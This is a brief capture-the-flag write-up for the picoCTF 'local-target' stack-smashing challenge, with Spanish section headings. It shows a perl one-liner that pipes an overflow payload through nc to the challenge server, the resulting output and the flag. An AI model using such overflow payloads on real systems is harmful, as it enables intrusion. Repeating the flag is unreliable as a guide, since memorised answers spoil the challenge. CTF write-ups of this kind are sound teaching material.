## Descripcion
Smash the stack

The program is available [here](https://artifacts.picoctf.net/c/518/local-target). You can view source [here](https://artifacts.picoctf.net/c/518/local-target.c). And connect with it using: `nc saturn.picoctf.net 54207`

## Pistas

## Solucion

```
jt@jt-VirtualBox:~/Desktop/repos/files/P3/picker$ (perl -e 'print "A"x24 . "\x41";'; echo) | nc saturn.picoctf.net 54207
Enter a string: 
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}

```
## bandera
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}

## Notas adicionales 

## Referencias